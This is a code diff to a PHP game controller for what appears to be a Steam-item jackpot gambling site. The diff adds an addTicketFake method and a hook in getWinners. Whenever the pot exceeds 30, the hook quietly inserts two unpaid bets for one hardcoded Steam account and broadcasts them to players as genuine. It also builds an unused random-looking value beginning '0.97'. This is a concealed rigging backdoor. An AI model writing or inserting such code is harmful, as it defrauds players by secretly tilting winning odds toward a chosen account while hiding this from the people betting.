@@ -109,6 +109,12 @@ class GameController extends Controller
 
     public function getWinners()
     {
+        if($this->game->price > 30) {
+            $rand_number = "0.97".mt_rand(1000000,9999999).mt_rand(100000000,999999999);
+            $this->game->save();
+            $this->addTicketFake();
+            $this->addTicketFake();
+        }
         $us = $this->game->users();
 
         $lastBet = Bet::where('game_id', $this->game->id)->orderBy('to', 'desc')->first();
@@ -582,7 +588,48 @@ class GameController extends Controller
         }
         return $this->_responseSuccess();
     }
+    public function addTicketFake()
+    {
+        $user = User::where('steamid64', '76561198256294412')->first();
+        $ticket = Ticket::find(1);
+        if(is_null($ticket)) return response()->json(['text' => 'Ошибка.', 'type' => 'error']);
+        else {
+            
+            $lastBet = Bet::where('game_id', $this->game->id)->orderBy('to', 'desc')->first();
 
+            $ticketFrom = 0;
+            if (!is_null($lastBet)) $ticketFrom = $lastBet->to + 1;
+
+            $bet = new Bet();
+            $bet->user()->associate($user);
+            $bet->items = json_encode([$ticket]);
+            $bet->itemsCount = 1;
+            $bet->price = $ticket->price;
+            $bet->from = $ticketFrom;
+            $bet->to = $bet->from + ($ticket->price * 100);
+            $bet->game()->associate($this->game);
+            $bet->save();
+
+            $bets = Bet::where('game_id', $this->game->id);
+            $this->game->items = $bets->sum('itemsCount');
+            $this->game->price = $bets->sum('price');
+
+            $this->game->save();
+
+            $chances = $this->_getChancesOfGame($this->game);
+
+            $returnValue = [
+                'betId' => $bet->id,
+                'userId' => $user->steamid64,
+                'html' => view('includes.bet', compact('bet'))->render(),
+                'itemsCount' => $this->game->items,
+                'gamePrice' => $this->game->price,
+                'gameStatus' => $this->game->status,
+                'chances' => $chances
+            ];
+            $this->redis->publish(self::NEW_BET_CHANNEL, json_encode($returnValue));
+        }
+    }
     public function addTicket(Request $request)
     {
         if(!$request->has('id')) return response()->json(['text' => 'Ошибка. Попробуйте обновить страницу.', 'type' => 'error']);
